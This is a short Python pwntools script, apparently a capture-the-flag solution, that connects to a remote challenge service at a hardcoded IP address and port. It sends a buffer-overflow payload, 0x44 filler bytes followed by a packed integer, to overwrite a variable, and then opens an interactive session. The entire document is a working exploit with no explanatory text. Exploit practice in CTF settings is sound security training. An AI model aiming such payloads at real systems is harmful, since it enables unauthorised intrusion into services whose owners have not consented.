from pwn import *

context.log_level = 'debug'

# p = process('./chal')
p = remote('34.70.212.151', 8004)

p.sendlineafter(b':', b'100')
p.sendlineafter(b':', b'A'*0x8)
p.sendlineafter(b'?', b'A'*0x44+p32(100))

p.interactive()